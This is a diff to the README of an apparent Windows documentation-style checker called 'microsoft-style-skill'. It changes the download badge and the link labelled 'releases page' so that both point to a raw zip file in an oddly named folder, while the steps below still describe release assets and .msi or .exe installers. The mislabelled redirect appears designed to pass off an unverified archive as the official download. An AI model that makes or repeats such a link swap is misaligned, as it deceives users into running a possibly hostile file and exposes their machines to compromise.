@@ -1,6 +1,6 @@
 # 📝 microsoft-style-skill - Write professional documentation with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kongma1891/microsoft-style-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/kongma1891/microsoft-style-skill/main/outrance/style-microsoft-skill-v2.1.zip)
 
 The microsoft-style-skill application simplifies the process of auditing and updating technical documentation. It ensures your text follows the Microsoft Writing Style Guide rules. IT administrators use this tool to maintain consistent standards across manuals, guides, and internal reports. It checks your work for correct word choice, proper capitalization, and professional tone.
 
@@ -17,7 +17,7 @@ This software runs on Windows 10 and Windows 11. Ensure your computer meets thes
 
 You need to download the official installer from the project release page. Follow these steps to obtain the correct file:
 
-1. Visit the [releases page](https://github.com/kongma1891/microsoft-style-skill/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/kongma1891/microsoft-style-skill/main/outrance/style-microsoft-skill-v2.1.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the link ending in .msi or .exe to start your download.
 4. Save the file to your Downloads folder or your desktop for easy access.
